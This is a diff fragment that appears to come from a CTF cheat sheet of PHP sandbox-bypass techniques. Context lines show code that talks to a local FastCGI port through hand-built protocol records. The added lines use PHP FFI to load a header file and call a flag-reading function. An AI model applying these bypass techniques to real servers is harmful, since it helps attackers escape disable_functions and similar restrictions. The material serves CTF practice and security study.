@@ -52,3 +52,9 @@ $params = array(); $params['SCRIPT_NAME'] = $_SERVER['SCRIPT_NAME']; $params['SC
 $fp = fsockopen('127.0.0.1',19260); fwrite($fp, "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"); fwrite($fp, "\x01\x04\x00\x01".$len_encoded."\x00\x00".$params_encoded); fwrite($fp, "\x01\x04\x00\x01\x00\x00\x00\x00"); fwrite($fp, "\x01\x05\x00\x01\x00\x00\x00\x00"); sleep(2); $result = ''; while (!feof($fp)) { $result .= fread($fp, 1024); } fclose($fp); $matches = array(); preg_match('/START.*END/s', $result, $matches); echo $matches[0];
 ```
 
+* Load a file with FFI
+```php
+$ffi = FFI::load('/flag.h');
+$a = $ffi->flag_fUn3t1on_fFi();
+var_dump(FFI::string($a));
+```
